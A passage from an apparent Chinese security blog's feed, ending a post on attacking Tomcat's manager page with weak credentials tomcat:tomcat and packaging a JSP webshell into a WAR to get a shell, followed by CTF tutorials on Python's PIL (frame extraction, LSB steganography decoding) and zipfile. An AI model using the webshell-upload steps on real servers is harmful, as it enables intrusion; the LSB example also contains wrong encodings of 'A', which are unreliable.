class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure><p>可见，用户tomcat拥有上述所有权限，密码是<code>tomcat</code>。</p><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><p>打开tomcat管理页面<code>http://your-ip:8080/manager/html</code>，输入弱密码<code>tomcat:tomcat</code>，即可访问后台：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1.png" alt="img"></p><p>上传war包即可直接getshell。</p><h5 id="war制作"><a href="#war制作" class="headerlink" title="war制作"></a>war制作</h5><ul><li>压缩jsp马然后改为war后缀</li></ul><ul><li><p>war包名字和shell名字一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 组件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-python库PIL的使用</title>
      <link href="2019/04/17/CTF-python%E5%BA%93PIL%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2019/04/17/CTF-python%E5%BA%93PIL%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-python库的使用-PIL库"><a href="#CTF-python库的使用-PIL库" class="headerlink" title="CTF-python库的使用-PIL库"></a>CTF-python库的使用-PIL库</h1><h2 id="PIL库"><a href="#PIL库" class="headerlink" title="PIL库"></a>PIL库</h2><h3 id="生成Image对象"><a href="#生成Image对象" class="headerlink" title="生成Image对象"></a>生成Image对象</h3><p>im是一个Image对象，属性有format，size，mode。format是格式，size 是一个元组，表示(宽，高)，mode则指的图片的模式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#生成一个image对象。</span></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line"><span class="comment">#显示图片</span></span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h3 id="Image对象常用方法"><a href="#Image对象常用方法" class="headerlink" title="Image对象常用方法"></a>Image对象常用方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">im.save(&#39;test.jpg&#39;, &#39;jpeg&#39;)保存到文件，第二个参数为格式</span><br><span class="line">im.show()显示图像，会启动一个新窗口</span><br><span class="line">im.size(这是属性不是方法)得到图像的大小，返回值为tuple，可以通过元组来读取。</span><br><span class="line">im &#x3D; im.convert(&#39;L&#39;)色彩空间的转换，支持RGB、CMYK等常见空间，注意这个函数不是就地的结果保存在返回值里</span><br><span class="line">im.colors()很有用的方法，返回颜色统计列表(count, color)，可以判断图像中的色彩分布</span><br><span class="line">im.hist()直方图，与colors方法类似，但直接返回的是每个像素的直方高度</span><br><span class="line">im.getpixel((x, y))得到某个像素点的颜色，一般返回(r, g, b)</span><br><span class="line">im.putpixel((x, y), color)设置某个像素点的颜色，这个操作是就地的</span><br></pre></td></tr></table></figure><h4 id="im-size"><a href="#im-size" class="headerlink" title="im.size"></a>im.size</h4><p>打印出像素值。也就是图片的高度宽度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">print(img.size)</span><br><span class="line">(<span class="number">2000</span>, <span class="number">1328</span>)</span><br></pre></td></tr></table></figure><p>遍历图片的每一个坐标或像素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">print(img.size)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">        print(i,j)</span><br></pre></td></tr></table></figure><h4 id="im-getpixel-x-y"><a href="#im-getpixel-x-y" class="headerlink" title="im.getpixel((x, y))"></a>im.getpixel((x, y))</h4><p>得到某个像素点的颜色，一般返回(r, g, b)</p><p>遍历每个像素点的颜色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;sunset.jpg&#x27;</span>)</span><br><span class="line">print(img.size)</span><br><span class="line">print(img.size)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">        print(img.getpixel((i, j)))</span><br></pre></td></tr></table></figure><h3 id="图片剪贴"><a href="#图片剪贴" class="headerlink" title="图片剪贴"></a>图片剪贴</h3><p>crop()方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">img = im.crop(box)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><p>box，是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。假设box是(b1,a1,b2,a2)，则所取区域是以各自坐标划线所围的区域。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/29.png" alt="29"></p><h3 id="图片黏贴"><a href="#图片黏贴" class="headerlink" title="图片黏贴"></a>图片黏贴</h3><p>paste()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">50</span>,<span class="number">50</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">im.paste(region,box)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><h3 id="图像分帧"><a href="#图像分帧" class="headerlink" title="图像分帧"></a>图像分帧</h3><p>seek()和tell()</p><p>tell是读取帧数，而seek是取当前帧数的图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&quot;flag.gif&quot;</span>)</span><br><span class="line">im.seek(<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">        im.show()</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="常见CTF题目"><a href="#常见CTF题目" class="headerlink" title="常见CTF题目"></a>常见CTF题目</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="图片模式"><a href="#图片模式" class="headerlink" title="图片模式"></a>图片模式</h4><p>9种，分别为1，L，P，RGB，RGBA，CMYK，YCbCr，I，F。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">模式&quot;1&quot;为二值图像，非黑即白。但是它每个像素用8个bit表示，0表示黑，255表示白。</span><br><span class="line"></span><br><span class="line">模式L&quot;为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;L&quot;模式是按照下面的公式转换的</span><br><span class="line"> L &#x3D; R * 299&#x2F;1000 + G * 587&#x2F;1000+ B * 114&#x2F;1000</span><br><span class="line"></span><br><span class="line">模式&quot;P&quot;为8位彩色图像，它的每个像素用8个bit表示，其对应的彩色值是按照调色板查询出来的。</span><br><span class="line"></span><br><span class="line">模式&quot;RGBA&quot;为32位彩色图像，它的每个像素用32个bit表示，其中24bit表示红色、绿色和蓝色三个通道，另外8bit表示alpha通道，即透明通道。</span><br><span class="line"></span><br><span class="line">模式&quot;CMYK&quot;为32位彩色图像，它的每个像素用32个bit表示。模式&quot;CMYK&quot;就是印刷四分色模式，它是彩色印刷时采用的一种套色模式，利用色料的三原色混色原理，加上黑色油墨，共计四种颜色混合叠加，形成所谓&quot;全彩印刷&quot;。</span><br><span class="line"> 四种标准颜色是：C：Cyan &#x3D; 青色，又称为&#39;天蓝色&#39;或是&#39;湛蓝&#39;M：Magenta &#x3D; 品红色，又称为&#39;洋红色&#39;；Y：Yellow &#x3D; 黄色；K：Key Plate(blacK) &#x3D; 定位套版色（黑色）。PIL中&quot;RGB&quot;转换为&quot;CMYK&quot;的公式如下：</span><br><span class="line"> C &#x3D; 255 - R</span><br><span class="line"> M &#x3D; 255 - G</span><br><span class="line"> Y &#x3D; 255 - B</span><br><span class="line"> K &#x3D; 0</span><br><span class="line"></span><br><span class="line">模式&quot;YCbCr&quot;为24位彩色图像，它的每个像素用24个bit表示。YCbCr其中Y是指亮度分量，Cb指蓝色色度分量，而Cr指红色色度分量。人的肉眼对视频的Y分量更敏感，因此在通过对色度分量进行子采样来减少色度分量后，肉眼将察觉不到的图像质量的变化。</span><br><span class="line"> 模式&quot;RGB&quot;转换为&quot;YCbCr&quot;的公式如下：</span><br><span class="line"> Y&#x3D; 0.257*R+0.504*G+0.098*B+16</span><br><span class="line"> Cb &#x3D; -0.148*R-0.291*G+0.439*B+128</span><br><span class="line"> Cr &#x3D; 0.439*R-0.368*G-0.071*B+128</span><br><span class="line"></span><br><span class="line">模式&quot;I&quot;为32位整型灰色图像，它的每个像素用32个bit表示，0表示黑，255表示白，(0,255)之间的数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;I&quot;模式是按照下面的公式转换的：</span><br><span class="line"> I &#x3D; R * 299&#x2F;1000 + G * 587&#x2F;1000 + B * 114&#x2F;1000</span><br><span class="line"></span><br><span class="line">模式&quot;F&quot;为32位浮点灰色图像，它的每个像素用32个bit表示，0表示黑，255表示白，(0,255)之间的数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;F&quot;模式是按照下面的公式转换的：</span><br><span class="line"> F &#x3D; R * 299&#x2F;1000+ G * 587&#x2F;1000 + B * 114&#x2F;1000</span><br><span class="line"> 模式&quot;F&quot;与模式&quot;L&quot;的转换公式是一样的，都是RGB转换为灰色值的公式，但模式&quot;F&quot;会保留小数部分.</span><br><span class="line"></span><br><span class="line">模式&quot;RGB&quot;为24位彩色图像，它的每个像素用24个bit表示，分别表示红色、绿色和蓝色三个通道。</span><br><span class="line"> 在PIL中，对于彩色图像，open后都会转换为&quot;RGB&quot;模式，然后该模式可以转换为其他模式，比如&quot;1&quot;、&quot;L&quot;、&quot;P&quot;和&quot;RGBA&quot;，这几种模式也可以转换为&quot;RGB&quot;模式。</span><br></pre></td></tr></table></figure><h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h4><p>拿到许多图片，只有全白和全黑，考虑白色是0，黑色是1。</p><p>首先获取指定坐标的rgb，然后写脚本转换成二进制，二进制转化ascii。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;./gif/0.jpg&#x27;</span>)</span><br><span class="line">print(list(img.getpixel((<span class="number">1</span>,<span class="number">1</span>))))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">104</span>):</span><br><span class="line">    img = Image.open(<span class="string">&#x27;./gif/&#123;&#125;.jpg&#x27;</span>.format(i))</span><br><span class="line">    <span class="keyword">if</span> list(img.getpixel((<span class="number">1</span>,<span class="number">1</span>)))==[<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>]:</span><br><span class="line">        flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">8</span>):</span><br><span class="line">    flag+=chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="glance-gif"><a href="#glance-gif" class="headerlink" title="glance.gif"></a>glance.gif</h4><p>具体思路就是分帧，粘贴，但是在写脚本的时候还需要仔细一点，有许多细节需要处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im=Image.open(<span class="string">&#x27;glance.gif&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">        im.save(<span class="string">&#x27;./gif/&#123;&#125;.png&#x27;</span>.format(i))</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">im2=Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">201</span>):</span><br><span class="line">    image=Image.open(<span class="string">&#x27;./gif/&#123;&#125;.png&#x27;</span>.format(i))</span><br><span class="line">    im2.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">    width = width +<span class="number">2</span></span><br><span class="line">im2.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">im2.show()</span><br></pre></td></tr></table></figure><p>在一开始处理的时候，我是直接拼接的图片，没有尝试先去打开一个图片(open)然后粘贴，程序报错。</p><p><code>ValueError: unknown color specifier: &#39;./gif/1.png&#39;</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image=Image.open(<span class="string">&#x27;./gif/&#123;&#125;.png&#x27;</span>.format(i))<span class="comment">#这个很重要。</span></span><br><span class="line">im2.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br></pre></td></tr></table></figure><p>这里的坐标位置一定要处理好，首先我们需要知道，图像的高度和宽度。由于只需要横向粘贴，也就是说图片都需要集中在一行上，所以第二个坐标一定是0，第四个坐标一定是图片的高度。每个图片宽2，所以第一个和第二个坐标相差2，每张图片的间隔距离也是2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im2.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br></pre></td></tr></table></figure><h4 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h4><p>任何一个像素点的颜色可由<strong>三原色RGB</strong>确定，每个颜色有8bit，因而RGB最大取值为 <code>(255, 255, 255)</code>——RGB一共包含2563=16777216‬2563=16777216‬（1600万）种颜色，而人眼可以区分约1000万种不同的颜色，这意味着剩余约600万种颜色人眼无法识别。</p><p>LSB隐写就是将信息藏在各个像素点的某个颜色的最后一位上，因为是最后一位，对颜色的更改是人眼无法识别出来的，起到了隐藏的效果。</p><p>例子：</p><p>倘若在一张图片中，我们想隐藏 <code>A</code> 这个信息，那么先将 <code>A</code> 的十六进制Unicode码 <code>0x61</code> 转换为二进制 <code>01100001</code>我们在三原色中随机选择一种颜色——比如说<strong>红</strong>，因为要隐藏的 <code>A</code> 占8个位，所以在这张图片中<strong>任意</strong>选择<strong>连续</strong>的8个像素点，将这8个像素点的RGB，代表红色的8bit的最后一位，依次修改为 <code>01100001</code>。</p><p>举个例子：</p><p>假设您想要将消息”A”隐藏到一个4x4的图像中，该图像具有以下像素值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(225, 12, 99), (155, 2, 50), (99, 51, 15), (15, 55, 22),(155, 61, 87), (63, 30, 17), (1, 55, 19), (99, 81, 66),(219, 77, 91), (69, 39, 50), (18, 200, 33), (25, 54, 190)]</span><br></pre></td></tr></table></figure><p>使用 ASCII 表 ，我们可以先将机密消息转换为十进制值，然后再转换为二进制：0110100。现在，我们对像素值逐一进行迭代，在将它们转换为二进制后，我们将每个最小有效位依次替换为该信息位。（例如 225 是 11100001，我们替换最后一位，最右边的（1）和机密消息的第一位（0），依次类推)。这样的操作只会对像素值进行 +1 或 -1 的修改，因此肉眼根本看不出来。执行最低有效位隐写术后得到的像素值如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(224, 13, 99),(154, 3, 50),(98, 50, 15),(15, 54, 23),(154, 61, 87),(63, 30, 17),(1, 55, 19),(99, 81, 66),(219, 77, 91),(69, 39, 50),(18, 200, 33),(25, 54, 190)]</span><br></pre></td></tr></table></figure><p>png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。</p><p>查看图片模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line">print(img.mode)</span><br></pre></td></tr></table></figure><p>可以看到图片是L模式。最大特点就是像素没有<code>r,g,b</code>这么多，只有1个。</p><p>取图片的像素值的二进制的最后一位与1与运算，得到的数据如果为0则是白色，如果为1则是黑色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line">print(img.mode)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        print(<span class="string">&quot;原本像素为：&quot;</span>,tmp)</span><br><span class="line">        print(tmp&amp;<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;01.bmp&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> tmp&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-python库zipfile的使用</title>
      <link href="2019/04/10/CTF-python%E5%BA%93zipfile%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2019/04/10/CTF-python%E5%BA%93zipfile%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF–python库zipfile的使用"><a href="#CTF–python库zipfile的使用" class="headerlink" title="CTF–python库zipfile的使用"></a>CTF–python库zipfile的使用</h1><h2 id="zipfile库"><a href="#zipfile库" class="headerlink" title="zipfile库"></a>zipfile库</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Python zipfile模块用来做zip格式编码的压缩和解压缩的，要进行相关操作，首先需要实例化一个 ZipFile 对象。ZipFile 接受一个字符串格式压缩包名称作为它的必选参数，第二个参数为可选参数，表示打开模式，类似于文件操作，有r/w/a三种模式，分别代表读、写、添加，默认为r，即读模式。</p><p>zipfile里有两个非常重要的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><h4 id="ZipFile-对象"><a href="#ZipFile-对象" class="headerlink" title="ZipFile 对象"></a>ZipFile 对象</h4><p>定义</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipfile.ZipFile(file,mode,compress_type,allowZip64) <span class="meta">#创建一个ZipFile对象  </span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file: zip文件名</span><br><span class="line">mode: <span class="string">&#x27;r&#x27;</span>读已存在的zip文件,<span class="string">&#x27;w&#x27;</span>新建或覆盖已存在的zip文件,<span class="string">&#x27;a&#x27;</span>附加到现存的 zip文档</span><br><span class="line">compress_type: zipfile.ZIP_STORED 默认不压缩, zipfile.ZIP_DEFLATED 压缩</span><br><span class="line">allowZip64 : 默认 False, zip超过<span class="number">2</span>G设置为True</span><br></pre></td></tr></table></figure><p>以只读的方式打开一个zip文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;zipfile.ZipFile filename=<span class="string">&#x27;flag.zip&#x27;</span> mode=<span class="string">&#x27;r&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="ZipFile-成员函数"><a href="#ZipFile-成员函数" class="headerlink" title="ZipFile 成员函数"></a>ZipFile 成员函数</h4><ul><li>ZipFile.getinfo(name) #获取zip文档内指定文件信息, 返回zipfile.ZipInfo对象</li><li>ZipFile.infolist() #获取zip文档内所有文件信息, 返回zipfile.ZipInfo列表</li><li>ZipFile.namelist() #获取zip文档内所有文件的名称列表</li><li>ZipFile.extract(member,path,pwd) #把zip文档内指定文件解压到指定目录<ul><li>member : 要解压的文件名称或ZipInfo对象</li><li>path : 指定解压目录(默认当前目录)</li><li>pwd : 解压密码</li></ul></li><li>ZipFile.extractall(path,members,pwd) #解压zip文档到指定目录<ul><li>path : 解压目的目录, 默认当前目录</li><li>members : 设置的文件名列表, 默认全部</li><li>pwd : 解压密码</li></ul></li><li>ZipFile.printdir() #打印zip文档信息</li><li>ZipFile.setpassword(pwd) #设置zip文档密码<ul><li>pwd : 解压密码</li></ul></li><li>ZipFile.read(name,pwd) #获取zip文档内指定文件的二进制<ul><li>name : zip文档内指定文件</li><li>pwd : 解压密码</li></ul></li><li>ZipFile.write(filename,arcname,compress_type) #添加指定文件到zip文档中<ul><li>filename : 文件路径</li><li>arcname : 保存的名称</li><li>compress_type : zipfile.ZIP_STORED 默认不压缩, zipfile.ZIP_DEFLATED 压缩</li></ul></li><li>ZipFile.writestr(zinfo_or_arcname,bytes) #直接写二进制到压缩文档</li></ul><h5 id="z-Zipinfo"><a href="#z-Zipinfo" class="headerlink" title="z.Zipinfo()"></a>z.Zipinfo()</h5><p>z.infolist(), 它返回的就是压缩包内所有文件的信息，就是一个ZipInfo的列表。以下是一些压缩包常用的属性。比较常用的是 filename, file_size, header_offset, 分别为文件名，文件大小，文件数据在压缩包中的偏移，在打CTF的时候我们也常使用CRC，进行CRC爆破。</p><ul><li>ZipInfo.filename #文件名称</li><li>ZipInfo.date_time #最后修改时间, 返回(年,月,日,时,分,秒)的元组</li><li>ZipInfo.compress_type #压缩类型</li><li>ZipInfo.comment #文档说明</li><li>ZipInfo.extr #扩展项数据</li><li>ZipInfo.create_system #创建该文档的系统</li><li>ZipInfo.create_version #创建该文档的PKZIP版本</li><li>ZipInfo.extract_version #解压该文档所需的PKZIP版本</li><li>ZipInfo.reserved #预留字段</li><li>ZipInfo.flag_bits #zip标志位</li><li>ZipInfo.volume #文件头的卷标</li><li>ZipInfo.internal_attr #内部属性</li><li>ZipInfo.external_attr #外部属性</li><li>ZipInfo.header_offset #文件头偏移位</li><li>ZipInfo.CRC #未压缩文件的CRC-32</li><li>ZipInfo.compress_size #压缩后大小</li><li>ZipInfo.file_size #未压缩大小</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span 